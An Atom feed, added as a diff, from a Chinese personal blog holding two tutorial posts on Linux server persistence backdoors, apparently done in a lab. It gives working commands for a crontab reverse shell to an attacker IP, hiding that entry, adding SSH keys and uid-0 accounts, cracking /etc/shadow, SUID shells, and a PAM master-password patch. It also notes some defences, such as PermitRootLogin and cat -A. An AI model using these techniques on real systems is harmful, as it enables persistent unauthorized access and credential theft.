@@ -1,0 +1,332 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://www.sycamore.top</id>
+    <title>Sycamore&#39;s Blog • Posts by &#34;backdoor&#34; tag</title>
+    <link href="https://www.sycamore.top" />
+    <updated>2022-04-02T15:36:35.000Z</updated>
+    <category term="Python" />
+    <category term="计算机视觉" />
+    <category term="深度学习" />
+    <category term="Crypto" />
+    <category term="Hexo" />
+    <category term="shokaX" />
+    <category term="博客主题" />
+    <category term="实习" />
+    <category term="springboot" />
+    <category term="CTF" />
+    <category term="Misc" />
+    <category term="Web" />
+    <category term="Miec" />
+    <category term="Re" />
+    <category term="Pwn" />
+    <category term="Backdoor" />
+    <category term="Linux" />
+    <category term="Kali" />
+    <category term="Trojan horse" />
+    <category term="Metasploit" />
+    <category term="frp" />
+    <category term="shellter" />
+    <category term="Reverse Shell" />
+    <category term="Develop" />
+    <category term="Electron" />
+    <category term="Google Translate" />
+    <category term="node" />
+    <category term="Hitokoto" />
+    <category term="npm" />
+    <category term="plugs" />
+    <category term="RCE，loophole" />
+    <category term="毕业设计" />
+    <category term="机器学习" />
+    <category term="Diary" />
+    <category term="Australia" />
+    <category term="Mod" />
+    <category term="CP2077" />
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
+        <title>linux 服务器常见的留后门方式（二）</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
+        <content type="html">&lt;div class=&#34;note primary&#34;&gt;
+&lt;p&gt;整理好了搭环境的文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnN5Y2Ftb3JlLnRvcC8yMDIyLzAzLzIxL0xJTlVYJUU1JTkwJThFJUU5JTk3JUE4JUU1JUE0JThEJUU3JThFJUIwJUU3JThFJUFGJUU1JUEyJTgzJUU2JTkwJUFEJUU1JUJCJUJBLw==&#34;&gt;LINUX 后门复现环境搭建&lt;/span&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的&lt;strong&gt;后门&lt;/strong&gt;。其目的是，方便攻击者以后对该服务器进行持久性的攻击。&lt;/p&gt;
+&lt;p&gt;其中，在 linux 服务器上留后门的常见技术，&lt;strong&gt;本文中会提及&lt;/strong&gt;如下几种：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SSH 公钥免密&lt;/li&gt;
+&lt;li&gt;crontab 后门&lt;br /&gt;
+...&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;ssh公钥免密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh公钥免密&#34;&gt;#&lt;/a&gt; SSH 公钥免密&lt;/h2&gt;
+&lt;p&gt;简而言之，&lt;strong&gt;SSH 公钥免密&lt;/strong&gt;就是，将&lt;strong&gt;攻击者&lt;/strong&gt;生成的 &lt;strong&gt;ssh 公钥&lt;/strong&gt;写到&lt;strong&gt;目标服务器&lt;/strong&gt;的 &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt;  中（手动在目标机上完成注册），&lt;br /&gt;
+然后&lt;strong&gt;攻击者&lt;/strong&gt;就可以利用对应的&lt;strong&gt;私钥&lt;/strong&gt;免密登录。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;实现：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;使用 &lt;strong&gt;Xshell&lt;/strong&gt; 的 工具 -&amp;gt; 新建用户密钥生成向导，完成&lt;strong&gt; ssh 公钥、私钥&lt;/strong&gt;的生成：&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442537/Typera/2023/04/0c7400e842c42ccbcd324c9147cf6c24.png&#34; alt=&#34;image-20230426010853712&#34; /&gt;&lt;br /&gt;
+（填入密码)&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;保存生成的公钥文件（id_rsa_2048.pub），传到&lt;strong&gt;目标服务器&lt;/strong&gt;上，&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442569/Typera/2023/04/8a2edc41bc3463490d0617bcbbd9acd1.png&#34; alt=&#34;image-20230426010925673&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;寻找 &lt;strong&gt;authorized_keys&lt;/strong&gt; 文件，命令 &lt;code&gt;find -name authorized_keys&lt;/code&gt; ，&lt;br /&gt;
+如果没有，就通过命令 &lt;code&gt;touch /root/.ssh/authorized_keys&lt;/code&gt;  创建。&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;命令 &lt;code&gt;ssh-keygen -t rsa&lt;/code&gt;  开启免密登录功能，&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;通过命令 &lt;code&gt;cat 公钥路径 &amp;gt;&amp;gt; /root/.ssh/authorized_keys&lt;/code&gt;  把公钥写入到&lt;strong&gt; authorized_keys&lt;/strong&gt;，完成注册&lt;br /&gt;
+ &amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;修改文件权限 &lt;code&gt;chmod 600 ~/.ssh/authorized_keys&lt;/code&gt; &lt;br /&gt;
+ &lt;code&gt;chmod 700 ~/.ssh&lt;/code&gt; &lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;攻击者使用&lt;strong&gt; Xshell&lt;/strong&gt; 生成的&lt;strong&gt;私钥&lt;/strong&gt;和之前填写的&lt;strong&gt;密码&lt;/strong&gt;，登录目标服务器&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442599/Typera/2023/04/f0b36186750c7e6ae6e0cfb6e31536aa.png&#34; alt=&#34;image-20230426010955314&#34; /&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442619/Typera/2023/04/3707348bcf16ceccd18bb0594ff0933d.png&#34; alt=&#34;image-20230426011015095&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;crontab后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crontab后门&#34;&gt;#&lt;/a&gt; crontab 后门&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Crond&lt;/strong&gt; 服务启动后，会&lt;strong&gt;定期&lt;/strong&gt;（默认一分钟检查一次）检查它的配置文件中，是否有要执行的任务。&lt;br /&gt;
+如果有，就会根据&lt;strong&gt;预先设定&lt;/strong&gt;的&lt;strong&gt;定时任务规则&lt;/strong&gt;自动执行该任务。&lt;br /&gt;
+crontab 是用来定期执行程序的命令，&lt;br /&gt;
+我们可以通过&lt;strong&gt; crontab&lt;/strong&gt; 命令制造定时后门：&lt;br /&gt;
+ &lt;code&gt;(crontab -l;echo &#39;*/60 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/192.168.158.132/2333;exec 0&amp;lt;&amp;amp;9;exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i&#39;)|crontab -&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;解释：&lt;/strong&gt;&lt;br /&gt;
+ &lt;code&gt;echo &#39;*/60 * * * *&#39;&lt;/code&gt; ：设定每 60 分钟执行一次；&lt;br /&gt;
+ &lt;code&gt;exec 9&amp;lt;&amp;gt;/dev/tcp/192.168.158.132/2333&lt;/code&gt; ：利用 bash 提供的功能，对 &lt;code&gt;/dev/tcp/&lt;/code&gt;  开头的字符串进行&lt;strong&gt;解析&lt;/strong&gt;，指定&lt;strong&gt;服务器 IP&lt;/strong&gt; 为：192.168.158.132（&lt;strong&gt;攻击机&lt;/strong&gt; IP），&lt;strong&gt;端口号&lt;/strong&gt;为 2333，指定描述符为 9，建立网络连接；&lt;br /&gt;
+ &lt;code&gt;exec 0&amp;lt;&amp;amp;9;exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;&lt;/code&gt; ：&lt;strong&gt;文件描述符&lt;/strong&gt; 0：stdin，1：stdout，把标准输入输出&lt;strong&gt;都&lt;/strong&gt;重定向到描述符 9；&lt;br /&gt;
+ &lt;code&gt;/bin/bash --noprofile -i&lt;/code&gt; ：开一个 Shell。&lt;br /&gt;
+其实就是利用 Bash &lt;strong&gt;反弹&lt;/strong&gt;一个&lt;strong&gt; Shell&lt;/strong&gt; 到指定的攻击者 IP&lt;/p&gt;
+&lt;p&gt;（ubuntu 默认&lt;strong&gt;没开&lt;/strong&gt; bash 的网络重定向选项，需要加上 &lt;code&gt;–enable-net-redirections&lt;/code&gt;  重新编译 bash）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;隐藏：&lt;/strong&gt;&lt;br /&gt;
+但是这样的一个后门，管理员直接执行 &lt;code&gt;crontab -l&lt;/code&gt;  就能看到我们设定的定时任务。&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442659/Typera/2023/04/e8f07ae16e6573488c17eeea6f3339f2.png&#34; alt=&#34;image-20230426011055514&#34; /&gt;&lt;br /&gt;
+ 这个命令其实是在读取  &lt;code&gt;/var/spool/cron/crontabs/root&lt;/code&gt;  文件。&lt;br /&gt;
+所以，我们可以利用 cat 的一个缺陷，使用一些&lt;strong&gt;转义字符&lt;/strong&gt;，比如 \r 回车符 \n 换行符 \f 换页符，来&lt;strong&gt;隐藏&lt;/strong&gt;我们不想让管理员看到的命令：&lt;br /&gt;
+ &lt;code&gt;(crontab -l;printf &amp;quot;*/60 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/192.168.158.132/2333;exec 0&amp;lt;&amp;amp;9;exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i;\rno crontab for &lt;/code&gt; whoami &lt;code&gt;%100c\n&amp;quot;)|crontab -&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442674/Typera/2023/04/0af7f80743588f2bae6b80f3903e55c6.png&#34; alt=&#34;image-20230426011110789&#34; /&gt; 但是，若是使用 &lt;code&gt;cat -A /var/spool/cron/crontabs/root&lt;/code&gt;  还是可以看到我们隐藏的东西的。&lt;/p&gt;
+</content>
+        <category term="Backdoor" />
+        <category term="Linux" />
+        <category term="Kali" />
+        <updated>2022-04-02T15:36:35.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/</id>
+        <title>linux 服务器常见的留后门方式（一）</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E5%90%8E%E9%97%A8/linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E8%A7%81%E7%9A%84%E7%95%99%E5%90%8E%E9%97%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/"/>
+        <content type="html">&lt;div class=&#34;note primary&#34;&gt;
+&lt;p&gt;整理好了搭环境的文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnN5Y2Ftb3JlLnRvcC8yMDIyLzAzLzIxL0xJTlVYJUU1JTkwJThFJUU5JTk3JUE4JUU1JUE0JThEJUU3JThFJUIwJUU3JThFJUFGJUU1JUEyJTgzJUU2JTkwJUFEJUU1JUJCJUJBLw==&#34;&gt;LINUX 后门复现环境搭建&lt;/span&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的&lt;strong&gt;后门&lt;/strong&gt;。其目的是，方便攻击者以后对该服务器进行持久性的攻击。&lt;/p&gt;
+&lt;p&gt;其中，在 linux 服务器上留后门的常见技术，&lt;strong&gt;本文中会提及&lt;/strong&gt;如下几种：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;增加用户账号&lt;/li&gt;
+&lt;li&gt;破解用户密码&lt;/li&gt;
+&lt;li&gt;放置 SUID Shell&lt;/li&gt;
+&lt;li&gt;PAM 后门&lt;/li&gt;
+&lt;li&gt;SSH 软链接后门&lt;br /&gt;
+...&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;增加用户账号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#增加用户账号&#34;&gt;#&lt;/a&gt; 增加用户账号&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;前提&lt;/strong&gt;：getshell，已获得服务器的 root 权限&lt;/p&gt;
+&lt;h3 id=&#34;uid0用户可远程登陆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#uid0用户可远程登陆&#34;&gt;#&lt;/a&gt; uid=0 用户可远程登陆&lt;/h3&gt;
+&lt;p&gt;可以通过下面这一行指令，增加一个&lt;strong&gt;超级用户账号&lt;/strong&gt;：&lt;br /&gt;
+ &lt;code&gt;echo &amp;quot;用户名:x:0:0::/:/bin/sh&amp;quot; &amp;gt;&amp;gt; /etc/passwd&lt;/code&gt; &lt;br /&gt;
+ 然后通过： &lt;code&gt;passed 用户名&lt;/code&gt; 命令，修改所设超级用户的密码&lt;/p&gt;
+&lt;h4 id=&#34;实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现&#34;&gt;#&lt;/a&gt; 实现：&lt;/h4&gt;
+&lt;p&gt;输入命令：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441422/Typera/2023/04/a0f37b7036c0a7b07b57165d34510dc9.png&#34; alt=&#34;image-20230426005018227&#34; /&gt;&lt;br /&gt;
+（增加超级用户 backdoor）&lt;br /&gt;
+然后通过 ssh 登录 backdoor 账户：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441429/Typera/2023/04/a74b221974a59bbf958dea2d1d49823f.png&#34; alt=&#34;image-20230426005025313&#34; /&gt;&lt;br /&gt;
+ 可以看到已经是 root 权限了：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441436/Typera/2023/04/2523b36be81cd6a668b416a6bbf6ca66.png&#34; alt=&#34;image-20230426005032317&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;原理：给服务器增加一个&lt;strong&gt; ID 为 0&lt;/strong&gt; 的账号（因为&lt;strong&gt; root&lt;/strong&gt; 的 ID 为 0）&lt;br /&gt;
+我们可以通过 &lt;code&gt;vim /etc/passwd&lt;/code&gt;  命令打开 passwd，所有用户名称与 ID 的对应关系都保存在这里。&lt;br /&gt;
+在文件开头，能看到 root:&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441444/Typera/2023/04/8c6aa69ccdebdd7b75bfaddbc6d434d4.png&#34; alt=&#34;image-20230426005041049&#34; /&gt; 在文件的最后，我们能够找到刚刚添加的账号（backdoor）&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441452/Typera/2023/04/198980bd4423bb1cd26fcb757cbea990.png&#34; alt=&#34;image-20230426005048939&#34; /&gt; 已禁止 uid=0 用户远程登陆&lt;/p&gt;
+&lt;p&gt;管理员可以&lt;strong&gt;禁止 root 用户&lt;/strong&gt;通过&lt;strong&gt; ssh&lt;/strong&gt; 的方式，远程登录服务器。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;禁止方法&lt;/strong&gt;如下：&lt;br /&gt;
+（首先保证拥有一个普通用户，否则禁用之后就无法远程登陆了）&lt;br /&gt;
+ &lt;code&gt;vim /etc/ssh/sshd_config&lt;/code&gt;  打开 sshd_config 文件&lt;br /&gt;
+找到  &lt;code&gt;PermitRootLogin&lt;/code&gt; ，改为 no&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441458/Typera/2023/04/fd0d61d6e7b7879eb2ea1d5f0de03dd5.png&#34; alt=&#34;image-20230426005055500&#34; /&gt; 然后重启 ssh 服务&lt;br /&gt;
+此时再通过 xshell 远程登录 root 账户，就会被拒绝：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441465/Typera/2023/04/d70b4faf22b9b537f1bbe6bb7f20d1f3.png&#34; alt=&#34;image-20230426005101801&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;如果遇到了禁用 uid=0 账户远程登录的情况，也可以增加一个&lt;strong&gt;普通用户&lt;/strong&gt;：&lt;br /&gt;
+ &lt;code&gt;echo &amp;quot;用户名:x:1000:1000::/:/bin/sh&amp;quot; &amp;gt;&amp;gt; /etc/passwd&lt;/code&gt; &lt;br /&gt;
+ 道理都是一样的，可以观察到，我们使用的普通用户的 ID 就是 1000&lt;/p&gt;
+&lt;h3 id=&#34;无交互情况下添加账户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无交互情况下添加账户&#34;&gt;#&lt;/a&gt; 无交互情况下添加账户&lt;/h3&gt;
+&lt;p&gt;所利用漏洞的不一样，会导致攻击者可能面临无法交互、没有回显的情况，&lt;br /&gt;
+在这种情况下，使用前两种方法是困难的，先给出如下的方法：&lt;/p&gt;
+&lt;p&gt;命令 &lt;code&gt;useradd 用户名 -u 0 -o -g root -G root&lt;/code&gt;  以及 &lt;code&gt;echo &amp;quot;密码&amp;quot; | passwd --stdin 用户名&lt;/code&gt; ，&lt;br /&gt;
+若服务器基于&lt;strong&gt; Debian&lt;/strong&gt;，即不能使用 --stdin 操作的话，第二条改用命令 &lt;code&gt;echo 用户名:密码 | chpasswd&lt;/code&gt; ，或者粗暴地直接用 \n 回车（因为 passwd 是需要&lt;strong&gt;输入两次&lt;/strong&gt;密码的）： &lt;code&gt;echo &amp;quot;密码\n密码&amp;quot; | passwd 用户名&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;第一个命令：使用 useradd 命令增加用户，-u 设置用户 id 为 0（root 用户），-g-G 设置新用户所在群组及附加群组为 root。如果禁止 root 远程登录，更改对应的参数就行。&lt;/li&gt;
+&lt;li&gt;第二个命令：添加密码（linux 中新创建的用户是被锁定的，需使用 passwd 命令设置密码，才能投入使用）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h3&gt;
+&lt;p&gt;但是这种增加用户账号的方法，会很轻易地被管理员发现&lt;/p&gt;
+&lt;h2 id=&#34;破解用户密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#破解用户密码&#34;&gt;#&lt;/a&gt; 破解用户密码&lt;/h2&gt;
+&lt;p&gt;如果我们获得了某些用户的密码，那下次自然就可以直接登录了。&lt;/p&gt;
+&lt;p&gt;linux 在 passwd 中存储了用户的信息，但是 passwd 文件允许&lt;strong&gt;所有用户读取&lt;/strong&gt;，所以若是用户密码也存放在 passwd 中，将导致用户密码&lt;strong&gt;泄露&lt;/strong&gt;。&lt;br /&gt;
+因此 Linux 将密码信息&lt;strong&gt;单独存放&lt;/strong&gt;到 shadow 文件中。shadow &lt;strong&gt;只有 root 用户&lt;/strong&gt;拥有读权限，其他用户&lt;strong&gt;没有任何权限&lt;/strong&gt;，从而保证用户密码的安全性。&lt;/p&gt;
+&lt;p&gt;但是，如果获得 shadow 文件 **（/etc/shadow）**，你会看到里面的密码是这样的：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441478/Typera/2023/04/ee471def5fbcc8ec8666e76bd4403e8d.png&#34; alt=&#34;image-20230426005115328&#34; /&gt; 当然是密码的 hash 值，不会让你直接看到的密码的明文&lt;/p&gt;
+&lt;p&gt;但是，对于那些薄弱的密码，我们可以通过 &lt;strong&gt;John the Ripper&lt;/strong&gt; 弱口令扫描工具（Kali 自带）进行破解。使用方法如下&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用 unshadow 命令组合 passwd 和 shadow，获得 test： &lt;code&gt;unshadow /etc/passwd /etc/shadow &amp;gt; test&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;字典破解：使用自带的字典（usr/share/john/password.lst）：命令 &lt;code&gt;john test&lt;/code&gt; &lt;br /&gt;
+ 使用自己的字典：命令 &lt;code&gt;john --wordlist=字典路径 test&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;放置suid-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#放置suid-shell&#34;&gt;#&lt;/a&gt; 放置 SUID Shell&lt;/h2&gt;
+&lt;p&gt;前提：getshell，已获得服务器的 root 权限&lt;/p&gt;
+&lt;p&gt;SUID Shell 是一种&lt;strong&gt;能以 shell 拥有者权限运行&lt;/strong&gt;的 shell，&lt;br /&gt;
+这个后门其实就是更改了，拥有者为 root 的 shell 的属性（rwsr-xr-x）&lt;/p&gt;
+&lt;h3 id=&#34;命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令&#34;&gt;#&lt;/a&gt; 命令&lt;/h3&gt;
+&lt;p&gt;root 下执行命令：&lt;br /&gt;
+ &lt;code&gt;cp /bin/bash .shell&lt;/code&gt; &lt;br /&gt;
+ &lt;code&gt;chmod u+s .shell&lt;/code&gt; &lt;br /&gt;
+ 解释：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;复制 /bin/bash 为当前目录下名为 .shell 的文件，&lt;/li&gt;
+&lt;li&gt;更改 .shell 文件权限，设置为 u+s 后，其他用户&lt;strong&gt;都享有文件拥有者的权限&lt;/strong&gt;（而当前为 &lt;strong&gt;root&lt;/strong&gt;，即享有 root 权限）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;下次如果从普通用户登录服务器，就能用命令： &lt;code&gt;/.shell&lt;/code&gt;  ，运行这个 shell，从而获得 &lt;strong&gt;root&lt;/strong&gt; 权限。&lt;br /&gt;
+但是，bash2 针对 SUID Shell 做了一些&lt;strong&gt;护卫措施&lt;/strong&gt;，所以如果使用上述命令运行 .shell ，只能当你在&lt;strong&gt;本地&lt;/strong&gt;下（非远程连接）才能让 shell 的权限升为 root ，若是在远程运行，则还是原来的权限不变。&lt;/p&gt;
+&lt;p&gt;对于这种情况，需要使用这个命令运行： &lt;code&gt;/.shell -p&lt;/code&gt; ，这样在远程下也能获得 root 的 shell 了 &amp;gt;&lt;/p&gt;
+&lt;h3 id=&#34;实现-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现-2&#34;&gt;#&lt;/a&gt; 实现&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441485/Typera/2023/04/7f3bd66ffe0223053f8eec312efe1e52.png&#34; alt=&#34;image-20230426005121969&#34; /&gt;&lt;br /&gt;
+whoami 为 root&lt;/p&gt;
+&lt;h2 id=&#34;pam后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pam后门&#34;&gt;#&lt;/a&gt; PAM 后门&lt;/h2&gt;
+&lt;h3 id=&#34;pam简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pam简介&#34;&gt;#&lt;/a&gt; PAM 简介：&lt;/h3&gt;
+&lt;p&gt;在 Linux 中执行某些程序时，执行前要先对启动它的用户进行认证，比如我们经常使用的 &lt;strong&gt;su&lt;/strong&gt; 命令。&lt;br /&gt;
+但是，实际工作时，我们常常得用&lt;strong&gt;不同的认证机制&lt;/strong&gt;去认证不同程序的账号口令，这就会导致一个主机上有多个&lt;strong&gt;不同的认证系统&lt;/strong&gt;，这显然是不合理的。&lt;br /&gt;
+所以就有了&lt;strong&gt; PAM 机制&lt;/strong&gt;。&lt;strong&gt;PAM&lt;/strong&gt; 可以说是一套&lt;strong&gt; API&lt;/strong&gt;，使管理员可以随意地选择程序的认证方式。&lt;br /&gt;
+PAM 使用目录 **/etc/pam.d/&lt;strong&gt; 下的配置文件，即对应着不同的认证方式。程序调用目录下相应的配置文件，从而调用本地的认证模块（&lt;/strong&gt;/lib/security/**）。&lt;/p&gt;
+&lt;h3 id=&#34;后门思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门思路&#34;&gt;#&lt;/a&gt; 后门思路：&lt;/h3&gt;
+&lt;p&gt;我们&lt;strong&gt;登录&lt;/strong&gt;的时候，也是用 PAM 模块来验证我们的密码是否正确的。&lt;br /&gt;
+所以，我们可以从源码中找到&lt;strong&gt; PAM&lt;/strong&gt; 的传统密码验证模块（pam_unix.so），&lt;strong&gt;修改 PAM 的验证逻辑&lt;/strong&gt;，达成不去跟 shadow 里的密码校验，而是&lt;strong&gt;直接返回验证正确&lt;/strong&gt;的效果，&lt;br /&gt;
+然后编译出&lt;strong&gt;包含后门的 so 文件&lt;/strong&gt;，替换原模块。&lt;/p&gt;
+&lt;h3 id=&#34;实现-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现-3&#34;&gt;#&lt;/a&gt; 实现：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;直接使用脚本：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpdHNhbmQvc2hlbGwvYmxvYi9tYXN0ZXIvcGFtLnNo&#34;&gt;https://github.com/litsand/shell/blob/master/pam.sh&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;手动更改&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;下载pam源码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载pam源码&#34;&gt;#&lt;/a&gt; 下载 PAM 源码&lt;/h4&gt;
+&lt;p&gt;首先确认 PAM 版本：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Debian： &lt;code&gt;dpkg -s libpam-modules | grep -i version | cut -d&#39; &#39; -f2&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Centos： &lt;code&gt;rpm -qa|grep pam&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;以我的 kali 为例，使用 &lt;code&gt;dpkg -s libpam-modules | grep -i version | cut -d&#39; &#39; -f2&lt;/code&gt; ，得到输出：&lt;strong&gt;1.4.0-11&lt;/strong&gt;&lt;br /&gt;
+ 去 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5saW51eC1wYW0ub3JnL2xpYnJhcnkv&#34;&gt;http://www.linux-pam.org/library/&lt;/span&gt; 或者 GitHub 发布稳定版的地址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xpbnV4LXBhbS9saW51eC1wYW0vcmVsZWFzZXMlRUYlQkMlOEMlRTQlQjglOEIlRTglQkQlQkQlRTUlODglQjAlRTglODclQUElRTUlQjclQjElRTclODklODglRTYlOUMlQUMlRTclOUElODQlRTYlQkElOTAlRTclQTAlODElRUYlQkMlOUE=&#34;&gt;https://github.com/linux-pam/linux-pam/releases，下载到自己版本的源码：&lt;/span&gt;&lt;br /&gt;
+&lt;strong&gt;下载&lt;/strong&gt;： &lt;code&gt; wget https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz&lt;/code&gt; &lt;br /&gt;
+&lt;strong&gt; 解压&lt;/strong&gt;： &lt;code&gt;tar -xvf Linux-PAM-1.4.0.tar.xz&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;修改源码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改源码&#34;&gt;#&lt;/a&gt; 修改源码&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;效果 1：自定义密码添加：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;修改解压目录下的 &lt;code&gt;/modules/pam_unix/pam_unix_auth.c&lt;/code&gt;  文件：&lt;br /&gt;
+第 173 行下加入： &lt;code&gt;if (strcmp(p,&amp;quot;密码&amp;quot;)==0) &amp;#123;return PAM_SUCCESS;&amp;#125;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441501/Typera/2023/04/34fdc632b2e79b17065c6ee808b2095f.png&#34; alt=&#34;image-20230426005137550&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;很简单的代码：当输入的 p 和我们设定的 &amp;quot;密码&amp;quot; 相同的时候，返回直接验证成功。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;编译：&lt;/strong&gt;&lt;/p&gt;
